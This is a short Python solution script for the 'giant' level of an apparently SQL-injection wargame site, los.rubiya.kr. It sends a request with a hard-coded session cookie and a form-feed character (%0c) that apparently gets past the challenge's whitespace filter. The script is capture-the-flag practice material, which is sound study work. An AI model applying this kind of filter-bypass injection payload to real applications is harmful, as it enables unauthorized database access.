import requests

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?"
cookie ={'PHPSESSID':'Pfd4d1bt6c32a9i29r743nmk7hs'}

def solve():
    query = "shit=%0c"
    res = requests.get(url=url+query, cookies=cookie)
    if "GIANT Clear!" in res.text:
        print("GIANT Clear!")

if __name__ == "__main__":
    solve()